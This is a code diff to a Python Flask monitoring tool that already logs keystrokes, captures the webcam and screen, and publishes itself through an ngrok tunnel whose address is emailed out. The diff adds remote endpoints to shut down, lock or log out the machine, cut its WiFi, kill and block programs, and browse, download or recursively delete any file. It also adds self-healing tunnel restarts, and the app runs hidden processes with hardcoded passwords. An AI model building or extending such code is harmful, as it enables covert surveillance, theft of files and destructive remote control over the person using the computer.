@@ -43,6 +43,7 @@ from keystroke_logger_by_app import KeystrokeLoggerByApp
 from webcam_capture import WebcamCapture
 from live_monitor import LiveMonitor
 # from audio_monitor import AudioMonitor
+from app_blocker import ApplicationBlocker
 
 # Configure logging
 logging.basicConfig(
@@ -64,6 +65,7 @@ usb_monitor = None
 app_tracker = None
 activity_tracker = None
 ngrok_tunnel = None
+app_blocker = None
 
 # Monitor states
 monitor_states = {
@@ -348,6 +350,8 @@ def cleanup_and_exit():
             app_tracker.stop()
         if activity_tracker:
             activity_tracker.stop()
+        if app_blocker:
+            app_blocker.stop()
             
         # Clean up ngrok
         if ngrok_tunnel:
@@ -427,6 +431,19 @@ def login_required(f):
         auth_cookie = request.cookies.get('auth')
         if not auth_cookie or auth_cookie != 'happykutta':
             return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+def password_required(f):
+    """Decorator for system control routes that require password"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        data = request.get_json() if request.is_json else request.form
+        password = data.get('password')
+        
+        if not password or password != 'mangotree':
+            return jsonify({'success': False, 'error': 'Invalid password'}), 401
+        
         return f(*args, **kwargs)
     return decorated_function
 
@@ -1304,6 +1321,545 @@ def get_ngrok_status():
             'message': str(e)
         }), 500
 
+# ==================== SYSTEM CONTROL API ROUTES ====================
+
+@app.route('/api/system/status')
+@login_required
+def get_system_status():
+    """Get system status information"""
+    try:
+        import psutil
+        
+        # Get system information
+        cpu_percent = psutil.cpu_percent(interval=1)
+        memory = psutil.virtual_memory()
+        disk = psutil.disk_usage('/')
+        
+        # Get running processes count
+        process_count = len(psutil.pids())
+        
+        # Get network information
+        network = psutil.net_io_counters()
+        
+        # Get boot time
+        boot_time = datetime.fromtimestamp(psutil.boot_time())
+        uptime = datetime.now() - boot_time
+        
+        status = {
+            'cpu_percent': cpu_percent,
+            'memory_percent': memory.percent,
+            'memory_used_gb': round(memory.used / (1024**3), 2),
+            'memory_total_gb': round(memory.total / (1024**3), 2),
+            'disk_percent': disk.percent,
+            'disk_used_gb': round(disk.used / (1024**3), 2),
+            'disk_total_gb': round(disk.total / (1024**3), 2),
+            'process_count': process_count,
+            'network_sent_mb': round(network.bytes_sent / (1024**2), 2),
+            'network_recv_mb': round(network.bytes_recv / (1024**2), 2),
+            'uptime_hours': round(uptime.total_seconds() / 3600, 2),
+            'boot_time': boot_time.strftime('%Y-%m-%d %H:%M:%S')
+        }
+        
+        return jsonify({'success': True, 'status': status})
+    except Exception as e:
+        logger.error(f"Error getting system status: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/restart', methods=['POST'])
+@login_required
+@password_required
+def system_restart():
+    """Restart the system"""
+    try:
+        logger.info("Remote restart command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote restart command executed\n")
+        
+        # Execute restart command
+        subprocess.run(['shutdown', '/r', '/t', '30'], shell=True)
+        return jsonify({'success': True, 'message': 'System will restart in 30 seconds'})
+    except Exception as e:
+        logger.error(f"Error in remote restart: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/poweroff', methods=['POST'])
+@login_required
+@password_required
+def system_poweroff():
+    """Power off the system"""
+    try:
+        logger.info("Remote power off command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote power off command executed\n")
+        
+        # Execute power off command
+        subprocess.run(['shutdown', '/s', '/t', '30'], shell=True)
+        return jsonify({'success': True, 'message': 'System will power off in 30 seconds'})
+    except Exception as e:
+        logger.error(f"Error in remote power off: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/sleep', methods=['POST'])
+@login_required
+@password_required
+def system_sleep():
+    """Put system to sleep"""
+    try:
+        logger.info("Remote sleep command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote sleep command executed\n")
+        
+        # Execute sleep command
+        subprocess.run(['powercfg', '/hibernate', 'off'], shell=True)  # Disable hibernate first
+        subprocess.run(['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'], shell=True)
+        return jsonify({'success': True, 'message': 'System going to sleep'})
+    except Exception as e:
+        logger.error(f"Error in remote sleep: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/logout', methods=['POST'])
+@login_required
+@password_required
+def system_logout():
+    """Force logout current user"""
+    try:
+        logger.info("Remote logout command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote logout command executed\n")
+        
+        # Execute logout command
+        subprocess.run(['shutdown', '/l'], shell=True)
+        return jsonify({'success': True, 'message': 'User logged out'})
+    except Exception as e:
+        logger.error(f"Error in remote logout: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/lock', methods=['POST'])
+@login_required
+@password_required
+def system_lock():
+    """Lock the system"""
+    try:
+        logger.info("Remote lock command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote lock command executed\n")
+        
+        # Create lock flag file for overlay to detect
+        lock_flag_file = os.path.join('logs', 'lock_system.flag')
+        with open(lock_flag_file, 'w') as f:
+            f.write('locked')
+        
+        # Start system lock overlay
+        try:
+            subprocess.Popen([sys.executable, 'system_lock_overlay.py'], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+        except:
+            # Fallback to Windows lock
+            subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], shell=True)
+        
+        return jsonify({'success': True, 'message': 'System locked'})
+    except Exception as e:
+        logger.error(f"Error in remote lock: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/unlock', methods=['POST'])
+@login_required
+@password_required
+def system_unlock():
+    """Unlock the system"""
+    try:
+        logger.info("Remote unlock command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote unlock command executed\n")
+        
+        # Create unlock flag file for overlay to detect
+        unlock_flag_file = os.path.join('logs', 'unlock_system.flag')
+        with open(unlock_flag_file, 'w') as f:
+            f.write('unlocked')
+        
+        # Remove lock flag
+        lock_flag_file = os.path.join('logs', 'lock_system.flag')
+        if os.path.exists(lock_flag_file):
+            os.remove(lock_flag_file)
+        
+        return jsonify({'success': True, 'message': 'System unlocked'})
+    except Exception as e:
+        logger.error(f"Error in remote unlock: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/killwifi', methods=['POST'])
+@login_required
+@password_required
+def kill_wifi():
+    """Kill WiFi connection"""
+    try:
+        logger.info("Remote WiFi kill command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote WiFi kill command executed\n")
+        
+        # Try multiple methods to disable WiFi
+        success = False
+        
+        # Method 1: Disable WiFi interface
+        try:
+            result = subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'disable'], 
+                                  capture_output=True, text=True, shell=True, timeout=10)
+            if result.returncode == 0:
+                success = True
+                logger.info("WiFi disabled using netsh interface method")
+        except Exception as e:
+            logger.warning(f"Method 1 failed: {str(e)}")
+        
+        # Method 2: Disable WiFi adapter using device manager
+        if not success:
+            try:
+                result = subprocess.run([
+                    'powershell', '-Command', 
+                    'Get-NetAdapter -Name "Wi-Fi" | Disable-NetAdapter -Confirm:$false'
+                ], capture_output=True, text=True, shell=True, timeout=10)
+                if result.returncode == 0:
+                    success = True
+                    logger.info("WiFi disabled using PowerShell method")
+            except Exception as e:
+                logger.warning(f"Method 2 failed: {str(e)}")
+        
+        # Method 3: Disable all wireless adapters
+        if not success:
+            try:
+                result = subprocess.run([
+                    'powershell', '-Command', 
+                    'Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Wireless*" -or $_.Name -like "*Wi-Fi*"} | Disable-NetAdapter -Confirm:$false'
+                ], capture_output=True, text=True, shell=True, timeout=10)
+                if result.returncode == 0:
+                    success = True
+                    logger.info("WiFi disabled using wireless adapter method")
+            except Exception as e:
+                logger.warning(f"Method 3 failed: {str(e)}")
+        
+        if success:
+            return jsonify({'success': True, 'message': 'WiFi disabled successfully'})
+        else:
+            return jsonify({'success': False, 'error': 'Failed to disable WiFi using all methods'}), 500
+            
+    except Exception as e:
+        logger.error(f"Error killing WiFi: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/enablewifi', methods=['POST'])
+@login_required
+@password_required
+def enable_wifi():
+    """Enable WiFi connection"""
+    try:
+        logger.info("Remote WiFi enable command received")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote WiFi enable command executed\n")
+        
+        # Try multiple methods to enable WiFi
+        success = False
+        
+        # Method 1: Enable WiFi interface
+        try:
+            result = subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'enable'], 
+                                  capture_output=True, text=True, shell=True, timeout=10)
+            if result.returncode == 0:
+                success = True
+                logger.info("WiFi enabled using netsh interface method")
+        except Exception as e:
+            logger.warning(f"Method 1 failed: {str(e)}")
+        
+        # Method 2: Enable WiFi adapter using device manager
+        if not success:
+            try:
+                result = subprocess.run([
+                    'powershell', '-Command', 
+                    'Get-NetAdapter -Name "Wi-Fi" | Enable-NetAdapter -Confirm:$false'
+                ], capture_output=True, text=True, shell=True, timeout=10)
+                if result.returncode == 0:
+                    success = True
+                    logger.info("WiFi enabled using PowerShell method")
+            except Exception as e:
+                logger.warning(f"Method 2 failed: {str(e)}")
+        
+        # Method 3: Enable all wireless adapters
+        if not success:
+            try:
+                result = subprocess.run([
+                    'powershell', '-Command', 
+                    'Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Wireless*" -or $_.Name -like "*Wi-Fi*"} | Enable-NetAdapter -Confirm:$false'
+                ], capture_output=True, text=True, shell=True, timeout=10)
+                if result.returncode == 0:
+                    success = True
+                    logger.info("WiFi enabled using wireless adapter method")
+            except Exception as e:
+                logger.warning(f"Method 3 failed: {str(e)}")
+        
+        if success:
+            return jsonify({'success': True, 'message': 'WiFi enabled successfully'})
+        else:
+            return jsonify({'success': False, 'error': 'Failed to enable WiFi using all methods'}), 500
+            
+    except Exception as e:
+        logger.error(f"Error enabling WiFi: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/processes')
+@login_required
+def get_processes():
+    """Get list of running processes"""
+    try:
+        import psutil
+        
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
+            try:
+                proc_info = proc.info
+                if proc_info['cpu_percent'] > 0 or proc_info['memory_percent'] > 0:
+                    processes.append({
+                        'pid': proc_info['pid'],
+                        'name': proc_info['name'],
+                        'cpu_percent': round(proc_info['cpu_percent'], 1),
+                        'memory_percent': round(proc_info['memory_percent'], 1),
+                        'status': proc_info['status']
+                    })
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        
+        # Sort by CPU usage
+        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+        
+        return jsonify({'success': True, 'processes': processes[:50]})  # Return top 50
+    except Exception as e:
+        logger.error(f"Error getting processes: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/killprocess', methods=['POST'])
+@login_required
+@password_required
+def kill_process():
+    """Kill a specific process"""
+    try:
+        data = request.get_json()
+        pid = data.get('pid')
+        
+        if not pid:
+            return jsonify({'success': False, 'error': 'PID is required'}), 400
+        
+        logger.info(f"Remote kill process command received for PID: {pid}")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote kill process command executed for PID: {pid}\n")
+        
+        # Kill the process
+        import psutil
+        process = psutil.Process(pid)
+        process.terminate()
+        
+        return jsonify({'success': True, 'message': f'Process {pid} terminated'})
+    except Exception as e:
+        logger.error(f"Error killing process: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/blockapp', methods=['POST'])
+@login_required
+@password_required
+def block_application():
+    """Block an application"""
+    try:
+        data = request.get_json()
+        app_name = data.get('app_name')
+        
+        if not app_name:
+            return jsonify({'success': False, 'error': 'Application name is required'}), 400
+        
+        logger.info(f"Remote block application command received: {app_name}")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote block application command executed: {app_name}\n")
+        
+        # Add to blocked apps list
+        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
+        blocked_apps = []
+        
+        if os.path.exists(blocked_apps_file):
+            with open(blocked_apps_file, 'r') as f:
+                blocked_apps = json.load(f)
+        
+        if app_name not in blocked_apps:
+            blocked_apps.append(app_name)
+            
+        with open(blocked_apps_file, 'w') as f:
+            json.dump(blocked_apps, f)
+        
+        return jsonify({'success': True, 'message': f'Application {app_name} blocked'})
+    except Exception as e:
+        logger.error(f"Error blocking application: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/unblockapp', methods=['POST'])
+@login_required
+@password_required
+def unblock_application():
+    """Unblock an application"""
+    try:
+        data = request.get_json()
+        app_name = data.get('app_name')
+        
+        if not app_name:
+            return jsonify({'success': False, 'error': 'Application name is required'}), 400
+        
+        logger.info(f"Remote unblock application command received: {app_name}")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote unblock application command executed: {app_name}\n")
+        
+        # Remove from blocked apps list
+        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
+        blocked_apps = []
+        
+        if os.path.exists(blocked_apps_file):
+            with open(blocked_apps_file, 'r') as f:
+                blocked_apps = json.load(f)
+        
+        if app_name in blocked_apps:
+            blocked_apps.remove(app_name)
+            
+        with open(blocked_apps_file, 'w') as f:
+            json.dump(blocked_apps, f)
+        
+        return jsonify({'success': True, 'message': f'Application {app_name} unblocked'})
+    except Exception as e:
+        logger.error(f"Error unblocking application: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/blockedapps')
+@login_required
+def get_blocked_apps():
+    """Get list of blocked applications"""
+    try:
+        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
+        blocked_apps = []
+        
+        if os.path.exists(blocked_apps_file):
+            with open(blocked_apps_file, 'r') as f:
+                blocked_apps = json.load(f)
+        
+        return jsonify({'success': True, 'apps': blocked_apps})
+    except Exception as e:
+        logger.error(f"Error getting blocked apps: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/files')
+@login_required
+def list_files():
+    """List files in a directory"""
+    try:
+        path = request.args.get('path', os.path.expanduser('~'))
+        
+        if not os.path.exists(path):
+            return jsonify({'success': False, 'error': 'Path does not exist'}), 404
+        
+        files = []
+        directories = []
+        
+        try:
+            for item in os.listdir(path):
+                item_path = os.path.join(path, item)
+                try:
+                    stat = os.stat(item_path)
+                    item_info = {
+                        'name': item,
+                        'path': item_path,
+                        'size': stat.st_size,
+                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
+                        'is_dir': os.path.isdir(item_path)
+                    }
+                    
+                    if os.path.isdir(item_path):
+                        directories.append(item_info)
+                    else:
+                        files.append(item_info)
+                except (OSError, PermissionError):
+                    continue
+            
+            # Sort directories first, then files
+            directories.sort(key=lambda x: x['name'].lower())
+            files.sort(key=lambda x: x['name'].lower())
+            
+            return jsonify({
+                'success': True, 
+                'current_path': path,
+                'directories': directories,
+                'files': files
+            })
+        except PermissionError:
+            return jsonify({'success': False, 'error': 'Access denied'}), 403
+            
+    except Exception as e:
+        logger.error(f"Error listing files: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/download')
+@login_required
+def download_file():
+    """Download a file"""
+    try:
+        file_path = request.args.get('path')
+        
+        if not file_path or not os.path.exists(file_path):
+            return jsonify({'success': False, 'error': 'File not found'}), 404
+        
+        # Log the download
+        logger.info(f"Remote file download: {file_path}")
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote file download: {file_path}\n")
+        
+        return send_from_directory(
+            os.path.dirname(file_path),
+            os.path.basename(file_path),
+            as_attachment=True
+        )
+    except Exception as e:
+        logger.error(f"Error downloading file: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/system/delete', methods=['POST'])
+@login_required
+@password_required
+def delete_file():
+    """Delete a file or directory"""
+    try:
+        data = request.get_json()
+        path = data.get('path')
+        
+        if not path or not os.path.exists(path):
+            return jsonify({'success': False, 'error': 'Path does not exist'}), 404
+        
+        logger.info(f"Remote delete command received: {path}")
+        # Log the action
+        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
+            f.write(f"[{datetime.now()}] Remote delete command executed: {path}\n")
+        
+        if os.path.isdir(path):
+            shutil.rmtree(path)
+            message = f'Directory {path} deleted'
+        else:
+            os.remove(path)
+            message = f'File {path} deleted'
+        
+        return jsonify({'success': True, 'message': message})
+    except Exception as e:
+        logger.error(f"Error deleting file: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 @app.route('/api/dashboard/latest_captures')
 @login_required
 def api_dashboard_latest_captures():
@@ -1936,11 +2492,26 @@ def setup_ngrok(config):
                             return False
                         
                         # Check if tunnel is still accessible
-                        response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
-                        if response.status_code == 200:
-                            tunnels = response.json()
-                            if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
-                                return True
+                        try:
+                            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
+                            if response.status_code == 200:
+                                tunnels = response.json()
+                                if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
+                                    # Verify the tunnel is actually working by testing the public URL
+                                    tunnel_url = tunnels['tunnels'][0]['public_url']
+                                    if tunnel_url != self.public_url:
+                                        print(f"⚠️ Ngrok URL changed from {self.public_url} to {tunnel_url}")
+                                        self.public_url = tunnel_url
+                                    
+                                    # Test if the tunnel is actually accessible
+                                    try:
+                                        test_response = requests.get(f"{tunnel_url}/", timeout=5)
+                                        if test_response.status_code in [200, 401, 403]:  # Any response means tunnel is working
+                                            return True
+                                    except:
+                                        pass
+                        except:
+                            pass
                         
                         print("⚠️ Ngrok tunnel appears to be down")
                         return False
@@ -1958,9 +2529,21 @@ def setup_ngrok(config):
                         if self.proc:
                             try:
                                 self.proc.terminate()
-                                time.sleep(2)
+                                time.sleep(3)
+                                # Force kill if still running
+                                if self.proc.poll() is None:
+                                    self.proc.kill()
+                                    time.sleep(2)
                             except:
                                 pass
+                        
+                        # Kill any remaining ngrok processes
+                        try:
+                            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], 
+                                         capture_output=True, check=False)
+                            time.sleep(2)
+                        except:
+                            pass
                         
                         # Start new process
                         creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
@@ -1972,18 +2555,29 @@ def setup_ngrok(config):
                         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                            creationflags=creationflags)
                         
-                        time.sleep(5)  # Wait for restart
+                        # Wait longer for restart and get new URL
+                        time.sleep(8)  # Increased wait time
                         
-                        # Get new URL
-                        response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
-                        if response.status_code == 200:
-                            tunnels = response.json()
-                            if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
-                                self.public_url = tunnels['tunnels'][0]['public_url']
-                                print(f"✓ Ngrok restarted successfully: {self.public_url}")
-                                return True
+                        # Try multiple times to get new URL
+                        max_attempts = 15
+                        for attempt in range(max_attempts):
+                            try:
+                                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
+                                if response.status_code == 200:
+                                    tunnels = response.json()
+                                    if tunnels and 'tunnels' in tunnels and tunnels['tunnels']:
+                                        new_url = tunnels['tunnels'][0]['public_url']
+                                        if new_url != self.public_url:  # Ensure it's a new URL
+                                            self.public_url = new_url
+                                            print(f"✓ Ngrok restarted successfully with new URL: {self.public_url}")
+                                            return True
+                            except:
+                                pass
+                            
+                            if attempt < max_attempts - 1:
+                                time.sleep(2)
                         
-                        print("✗ Failed to restart ngrok")
+                        print("✗ Failed to restart ngrok or get new URL")
                         return False
                         
                     except Exception as e:
@@ -2097,7 +2691,7 @@ def main():
     """Main function to start all monitoring components"""
     try:
         global live_monitor, audio_monitor, internet_monitor, screenshot_taker, webcam_capture
-        global keystroke_logger, usb_monitor, app_tracker, activity_tracker, ngrok_tunnel
+        global keystroke_logger, usb_monitor, app_tracker, activity_tracker, ngrok_tunnel, app_blocker
         
         print("\n" + "="*50)
         print("Starting Mango Tree Monitor")
@@ -2247,15 +2841,35 @@ def main():
             if response.lower() != 'y':
                 return
 
+        # Start continuous ngrok health monitoring thread (every 5 minutes)
+        def ngrok_health_monitor():
+            while True:
+                time.sleep(5 * 60)  # 5 minutes
+                
+                if ngrok_tunnel:
+                    if not ngrok_tunnel.is_healthy():
+                        print("⚠️ Ngrok tunnel unhealthy, attempting restart...")
+                        if ngrok_tunnel.restart():
+                            print("✓ Ngrok tunnel restarted successfully")
+                            # Send success email with new URL
+                            send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
+                        else:
+                            print("✗ Failed to restart ngrok tunnel")
+                            # Send failure email
+                            send_ngrok_failure_email(config, local_ips)
+        
         # Start periodic email thread (every hour)
         def periodic_email():
             while True:
                 time.sleep(60 * 60)  # 1 hour
-                # Try to get the latest ngrok URL if possible
-                url = ngrok_url
-                if ngrok_tunnel and hasattr(ngrok_tunnel, 'public_url'):
-                    url = ngrok_tunnel.public_url
-                send_monitor_email(config, url, local_ips)
+                
+                # Send regular email with current URL
+                if ngrok_tunnel and ngrok_tunnel.is_healthy():
+                    send_monitor_email(config, ngrok_tunnel.public_url, local_ips)
+                else:
+                    send_ngrok_failure_email(config, local_ips)
+                    
+        threading.Thread(target=ngrok_health_monitor, daemon=True).start()
         threading.Thread(target=periodic_email, daemon=True).start()
 
         # Add to startup if running as an EXE
@@ -2325,6 +2939,12 @@ def main():
             # Audio Monitor (Disabled)
             print("  Audio Monitor disabled")
             audio_monitor = None
+
+            # Application Blocker
+            print("  Starting Application Blocker...")
+            app_blocker = ApplicationBlocker()
+            app_blocker.start()
+            print("    ✓ Application Blocker started")
 
         except Exception as e:
             print(f"\n✗ Failed to start components: {str(e)}")
